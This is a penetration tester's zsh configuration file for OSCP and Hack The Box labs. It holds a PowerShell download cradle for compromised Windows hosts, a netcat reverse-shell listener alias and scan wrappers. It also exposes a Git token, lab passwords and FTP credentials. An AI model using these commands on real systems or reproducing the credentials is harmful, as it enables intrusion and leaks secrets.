export TERM="xterm-256color"

# If you come from bash you might have to change your $PATH.
export PATH=$HOME/bin:/usr/local/bin:$PATH
export PATH=$HOME/.local/bin:$PATH

# Path to your oh-my-zsh installation.
export ZSH=$HOME/.oh-my-zsh

# Set name of the theme to load. Optionally, if you set this to "random"
# it'll load a random theme each time that oh-my-zsh is loaded.
# See https://github.com/robbyrussell/oh-my-zsh/wiki/Themes


POWERLEVEL9K_MODE='nerdfont-complete'

ZSH_THEME="powerlevel10k/powerlevel10k"
POWERLEVEL9K_MODE="nerdfont-complete"
#Remove comments if on a ubuntu box without gui
#POWERLEVEL9K_HOME_ICON=''
#POWERLEVEL9K_HOME_SUB_ICON=''
#POWERLEVEL9K_FOLDER_ICON=''
#POWERLEVEL9K_ETC_ICON=''
#POWERLEVEL9K_DISABLE_RPROMPT=true
#POWERLEVEL9K_USER_ICON="\uF415" # 
POWERLEVEL9K_NETWORK_ICON=''
POWERLEVEL9K_IP_INTERFACE='eth0'
POWERLEVEL9K_IP_BACKGROUND='blue'
export DEFAULT_USER="$User"
POWERLEVEL9K_ALWAYS_SHOW_CONTEXT=true	
POWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND="red"
POWERLEVEL9K_CONTEXT_ROOT_FOREGROUND="red"
POWERLEVEL9K_LEFT_SEGMENT_SEPARATOR='\uE0B0'
POWERLEVEL9K_LEFT_SUBSEGMENT_SEPARATOR=''
POWERLEVEL9K_LEFT_SEGMENT_END_SEPARATOR=''
POWERLEVEL9K_PROMPT_ON_NEWLINE=true
POWERLEVEL9K_OS_ICON='\uF306'
POWERLEVEL9K_TIME_BACKGROUND='blue'
POWERLEVEL9K_TIME_FORMAT="%D{%H:%M}"
POWERLEVEL9K_TIME_ICON=""
POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(ip os_icon context dir vcs virtualenv)
POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status time)
POWERLEVEL9K_DISABLE_CONFIGURATION_WIZARD=true



# Uncomment the following line to use case-sensitive completion.
# CASE_SENSITIVE="true"

# Uncomment the following line to use hyphen-insensitive completion. Case
# sensitive completion must be off. _ and - will be interchangeable.
# HYPHEN_INSENSITIVE="true"

# Uncomment the following line to disable bi-weekly auto-update checks.
# DISABLE_AUTO_UPDATE="true"

# Uncomment the following line to change how often to auto-update (in days).
# export UPDATE_ZSH_DAYS=13

# Uncomment the following line to disable colors in ls.
# DISABLE_LS_COLORS="true"

# Uncomment the following line to disable auto-setting terminal title.
# DISABLE_AUTO_TITLE="true"

# Uncomment the following line to enable command auto-correction.
# ENABLE_CORRECTION="true"

# Uncomment the following line to display red dots whilst waiting for completion.
# COMPLETION_WAITING_DOTS="true"

# Uncomment the following line if you want to disable marking untracked files
# under VCS as dirty. This makes repository status check for large repositories
# much, much faster.
# DISABLE_UNTRACKED_FILES_DIRTY="true"

# Uncomment the following line if you want to change the command execution time
# stamp shown in the history command output.
# The optional three formats: "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"
# HIST_STAMPS="mm/dd/yyyy"

# Would you like to use another custom folder than $ZSH/custom?
# ZSH_CUSTOM=/path/to/new-custom-folder

# Which plugins would you like to load? (plugins can be found in ~/.oh-my-zsh/plugins/*)
# Custom plugins may be added to ~/.oh-my-zsh/custom/plugins/
# Example format: plugins=(rails git textmate ruby lighthouse)
# Add wisely, as too many plugins slow down shell startup.
plugins=(
    git
    )
#plugins+=(zsh-nvm)

source $ZSH/oh-my-zsh.sh
source ~/.oh-my-zsh/plugins/zsh-autocomplete/zsh-autocomplete.plugin.zsh
# User configuration

# export MANPATH="/usr/local/man:$MANPATH"

# You may need to manually set your language environment
# export LANG=en_US.UTF-8

# Preferred editor for local and remote sessions
# if [[ -n $SSH_CONNECTION ]]; then
#   export EDITOR='vim'
# else
#   export EDITOR='mvim'
# fi

# Compilation flags
# export ARCHFLAGS="-arch x86_64"

# ssh
# export SSH_KEY_PATH="~/.ssh/rsa_id"

# Set personal aliases, overriding those provided by oh-my-zsh libs,
# plugins, and themes. Aliases can be placed here, though oh-my-zsh
# users are encouraged to define aliases within the ZSH_CUSTOM folder.
# For a full list of active aliases, run `alias`.
#
# Example aliases
# alias zshconfig="mate ~/.zshrc"
# alias ohmyzsh="mate ~/.oh-my-zsh"



export MARKER_KEY_NEXT_PLACEHOLDER="\C-b"   #change maker key binding from Ctr+t to Ctr+b

[[ -s "$HOME/.local/share/marker/marker.sh" ]] && source "$HOME/.local/share/marker/marker.sh"


# cheat sheets (github.com/chubin/cheat.sh), find out how to use commands
# example 'cheat tar'
# for language specific question supply 2 args first for language, second as the question
# eample: cheat python3 execute external program

#Zsh functions
#---------------------------------------------------

pxinstall() {
    python3 -m pipx install git+$1
}

dirsearch() {
    echo "Usage: dirsearch.py <url> <extension(s)>"
    python3 ~/Tools/dirsearch/dirsearch.py -u $1 -e $2 -t 50 b
}
dirsearch_r() {
    echo "Usage: dirsearch.py <url> <extension(s)>"
    python3 ~/Tools/dirsearch/dirsearch.py -u $1 -e $2 -t 50 b -r -R 4
}
nmap_fast() {
    echo "Usage: nmap_fast <output.txt> <ip/24>"
    nmap -sV -O --top-ports 200 --open -oA $1 $2
}
nmap_full() {
    echo "Usage: nmap_full <output.txt> <ip/24>"
    nmap -sC -sV -O --open -p- -oA $1 $2
}
nmap_udp() {
    echo "Usage: nmap_udp <output.txt> <ip/24>"
    nmap -sU -p- -oA $1 $2
}
nmap_recon() {
    echo "Usage: nmap_recon <output.txt> <ip/24>"
    nmap -sC -sV -oA $1 $2
}
dirb_without_auth() {
    echo "Usage: dirb <url> <wordlist> <output.txt>"
    dirb $1 $2 -o $3 -N 302,404 -R -w
}
dirb_with_auth() {
    echo "Usage: drib <url> <wordlist> <output.txt> <user> <password>"
    dirb $1 $2 -o $3 -N 302,404 -R -w -u $4:$5
}
nikto_without_auth() {
    echo "Usage: nikto <output.txt> <url>"
    nikto -Display 1234EPV -o $1 -Format htm -Tuning 1234567890abcdex -host $2 -404code -404string
}
nikto_with_auth() {
    echo "Usage: nikto <output.txt> <url> <user> <password>"
    nikto -Display 1234EPV -o $1 -Format htm -Tuning 1234567890abcdex -host $2 -404code -404string -id $3:$4
}
killproc() {
    echo "Usage: killproc <pid>"
    kill -9 $($1)
}
httpsrv() {
    echo "Usage: httpsrv <port>"
    python -m SimpleHTTPServer $1
}

cheat() {
    if [ "$2" ]; then
        curl "https://cheat.sh/$1/$2+$3+$4+$5+$6+$7+$8+$9+$10"
    else
        curl "https://cheat.sh/$1"
    fi
}
speedtest() {
    curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python3 -
}

dadjoke() {
    curl https://icanhazdadjoke.com
}
dict() {
    if [ "$3" ]; then
        curl "dict://dict.org/d:$1 $2 $3"
    elif [ "$2" ]; then
        curl "dict://dict.org/d:$1 $2"
    else
        curl "dict://dict.org/d:$1"
    fi
}
ipgeo() {
    # Specify ip or your ip will be used
    if [ "$1" ]; then
        curl "http://api.db-ip.com/v2/free/$1"
    else
        curl "http://api.db-ip.com/v2/free/$(myip)"
    fi
}
# You need xclip in order to use this apt install xclip
#Output powershell script to download file on compromised Windows machine
psdl(){
tunip=$(ip a s tun0 | awk -F'[/ ]+' '/inet[^6]/{print $3}');
read -p "File name to upload? " fileName
#fileName=$1 Or you can just pass the fileName into psdl without prompt
longstring="powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadFile('http://$tunip/$fileName','C:\\tmp\\$fileName')\"" # Fix C:\\ to your path
echo "$longstring" | xclip -selection clipboard
echo "Copied to clipboard"
}
extract() {
    if [ -f $1 ] ; then
        case $1 in
        *.tar.bz2)   tar xjf $1     ;;
        *.tar.gz)    tar xzf $1     ;;
        *.bz2)       bunzip2 $1     ;;
        *.rar)       unrar e $1     ;;
        *.gz)        gunzip $1      ;;
        *.tar)       tar xf $1      ;;
        *.tbz2)      tar xjf $1     ;;
        *.tgz)       tar xzf $1     ;;
        *.zip)       unzip $1       ;;
        *.Z)         uncompress $1  ;;
        *.7z)        7z x $1        ;;
        *) echo "'$1' cannot be extracted via extract()" ;;
            esac
        else
            echo "'$1' is not a valid file"
        fi
}
#Search nmap nse scripts
nsearch() {
    #example usage: nsearch smb
    locate *.nse | grep -o "$1".*;
}

#Aliases
#---------------------------------------------------

#Show icons for fonts for oh my zsh prompt
alias gicon="get_icon_names"

#Aliases Python Shortcuts
alias p="python $1" # saves typing python every time.
alias pi="pipenv install $1" # allows you to just type the package
alias ps="pipenv shell" # start a env with just "ps"

#Alias for Downloads shortcut
alias dl="cd ~/Downloads"

#Alias to show Zsh aliases
alias catz="cat ~/.zshrc"

#Alias to show bash aliases
alias catb="cat ~/.bashrc"

#Alias to install package with pipx
alias pinstall="python3 -m pipx install"

#alias to search windows scheduled tasks for privilege escalation
alias winsch='cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM'

#Kill any lingering openvpn sessions
alias killvpn='killall -w openvpn'

#Kill any lingering ssh sessions
alias killssh="killall ssh"

#Bash alias to use exa to list directories and files
alias l="exa -la"

#Bash alias to scripts directory
alias scriptdir="cd ~/Scripts/"

#Bash alias to tools directory
alias tooldir="cd ~/Tools/"

#Bash alias to echo and remind to tmux start log
alias tmuxlogging="echo 'prefix + shift +  p to start logging'"

#Bash alias to echo and remind to tmux save log
alias tmuxsave="echo 'prefix + alt + shift + p to save complete pane history'"

#Bash alias to echo and remind to install Tmux plugin
alias tmuxplugin="echo 'prefix + I in tmux session to install tmux plugins'"

#Bash alias to reload TMUX in session
alias tmuxreload="tmux source ~/.tmux.conf"

#Bash alias to go back to home directory
alias home="cd /home/kali/Desktop"

#Bash alias for gnome screenshot
alias gpic="gnome-screenshot -w"

#Bash aliases to connect to lab machines
alias rd2016='rdesktop -g 95% -u administrator 172.16.198.5'
alias rd2010='rdesktop -g 95% -u administrator 192.168.198.10'
alias studebian='ssh student@192.168.198.44'
alias rootdebian='ssh root@192.168.198.44'

#alias for searchsploit
alias ss='searchsploit'

#Sudo alias for other alias to run with root priv
alias sudo='sudo '

#Make diff look pretty
alias diff='diff --color=auto'

#MSF Pattern Create
alias msfpattern='/usr/share/metasploit-framework/tools/exploit/pattern_create.rb'

#MSF Pattern Offset
alias msfoffset='/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb'

#URL Encode alias
alias urlencode='python -c "import sys, urllib as ul; print ul.quote_plus(sys.argv[1])"'

#URL Decode alias
alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'

#Update using Linux date command
alias timeupdate='sudo date -s "$(wget -qSO- --max-redirect=0 google.com 2>&1 | grep Date: | cut -d -f5-8)Z"'

#View mounted drives
alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"

#Count files in directory
alias count='find . -type f | wc -l'

#Alias for show environment variables sorted
alias showenv='env | sort'

#Alias for git clone
alias gc='git clone'

#Alias for change and list directory
alias cdls='cd "$@" && ls'

#Alias for source command
alias s='source'

#Alias for source bash profile
alias sb='source ~/.bashrc'

#Alias for source zsh profile
alias zb='source ~/.zshrc'

#Copy progress bar
alias cpv='rsync -ah --info=progress2'

#Wget
alias wget='wget -c '

#Impacket Smb Server
alias smbsrv='smbserver.py share .'

#Clear screen
alias c='clear'

#List contents
alias ls='ls -al --color=auto'

#List hidden contents
alias l.='ls -d .* --color=auto'

#Colorize Grep
alias grep='grep --color=auto'

#History and jobs shortcuts
alias h='history'
alias j='jobs -l'

#Ports
alias ports='netstat -tulanp'

#HTB Start Openvpn
alias htblab='sudo openvpn /home/kali/Desktop/PWK/Setup/Gfuen640.ovpn'

#PWK Connect
alias pwk='sudo openvpn /home/kali/Desktop/PWK/Setup/OS-86533-PWK.ovpn'

#Change into PWK directory
alias pwkdir='cd /home/kali/Desktop/PWK/OSCP/lab/'

#Change into PUBLIC directory
alias pwkpublic='cd /home/kali/Desktop/PWK/OSCP/lab/PUBLIC/'

#Change into IT Directory
alias pwkit='cd /home/kali/Desktop/PWK/OSCP/lab/IT/'

#Change into directory
alias ..='cd ../'
alias ...='cd ../../'  
alias ....='cd ../../../'

#Get Logs
alias logs='cd /root/'

#New Tmux
alias ts='tmux new-session -s'

#Netcat reverse shell
alias lsn='sudo rlwrap -r -f . nc -lnvp'

#Copy text to clipboard
alias clip='xclip -sel clip'

#aliases for FTP Server
alias startftp="systemctl restart pure-ftpd"
alias stopftp="systemctl stop pure-ftpd"
alias statusftp="systemctl status pure-ftp"

#alias for PWK Connection
alias pwk_ping="ping 10.11.1.220"

#Nmap prettify
alias nmap="grc nmap"

#Less prettify
alias less='less -FSRXc'  

#End of aliases
#-------------------------------------------------------------------------------

#Export Env Variables
export WORD1="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
export WORD2="/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
export WORD3="/usr/share/wordlists/rockyou.txt"
export WORD4="/usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt"
export WORD5="/usr/share/wordlists/dirbuster/apache-user-enum-2.0.txt"
export WORD6="/usr/share/wordlists/dirb/others/best1050.txt"
export WORD7="/usr/share/wordlists/dirb/others/names.txt"
export SECLISTS="/usr/share/seclists"
export WORDDIR="/usr/share/wordlists"
export TARGET_RANGE="10.11.1.1-255"
export PWK_CONTROL="https://10.70.70.70/oscpanel/labcpanel.php?md=aa04b57c7f43f59f194decebb776223e&pid=792549&servers=0"
export GIT_PASS="09d200ef8f3d9f170655cbad5cb9cadf22bca4b5"
export TOOLS="~/Tools/"
export SCRIPT="~/Scripts/"
export USER="OS-86533"
export PASS="7vZGkrq9xL1"
export FTP_USER="offsec"
export FTP_PASS="lab"


#Bash Profile
#-------------------------------------------------------------------------------

#Bash Prompt Color Scheme
txtblk='\[\e[0;30m\]' # Black - Regular
txtred='\[\e[0;31m\]' # Red
txtgrn='\[\e[0;32m\]' # Green
txtylw='\[\e[0;33m\]' # Yellow
txtblu='\[\e[0;34m\]' # Blue
txtpur='\[\e[0;35m\]' # Purple
txtcyn='\[\e[0;36m\]' # Cyan
txtwht='\[\e[0;37m\]' # White
bldblk='\[\e[1;30m\]' # Black - Bold
bldred='\[\e[1;31m\]' # Red
bldgrn='\[\e[1;32m\]' # Green
bldylw='\[\e[1;33m\]' # Yellow
bldblu='\[\e[1;34m\]' # Blue
bldpur='\[\e[1;35m\]' # Purple
bldcyn='\[\e[1;36m\]' # Cyan
bldwht='\[\e[1;37m\]' # White
unkblk='\[\e[4;30m\]' # Black - Underline
undred='\[\e[4;31m\]' # Red
undgrn='\[\e[4;32m\]' # Green
undylw='\[\e[4;33m\]' # Yellow
undblu='\[\e[4;34m\]' # Blue
undpur='\[\e[4;35m\]' # Purple
undcyn='\[\e[4;36m\]' # Cyan
undwht='\[\e[4;37m\]' # White
bakblk='\[\e[40m\]'   # Black - Background
bakred='\[\e[41m\]'   # Red
badgrn='\[\e[42m\]'   # Green
bakylw='\[\e[43m\]'   # Yellow
bakblu='\[\e[44m\]'   # Blue
bakpur='\[\e[45m\]'   # Purple
bakcyn='\[\e[46m\]'   # Cyan
bakwht='\[\e[47m\]'   # White

#Bash prompt variables
day="${txtpur}"
time="${txtpur}"
user="${txtblu}"
host="${txtblu}"
dir="${txtwht}"
bracket="${txtpur}"

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=5000
HISTFILESIZE=5000

#Set MYIP environment variable
if test -e "/sys/class/net/tun0" ; then
	export MYIP=$(ip -f inet addr show tun0 | grep -Po 'inet \K[\d.]+') 
	alias myip="export MYIP=$(ip -f inet addr show tun0 | grep -Po 'inet \K[\d.]+') ; echo $MYIP"
fi
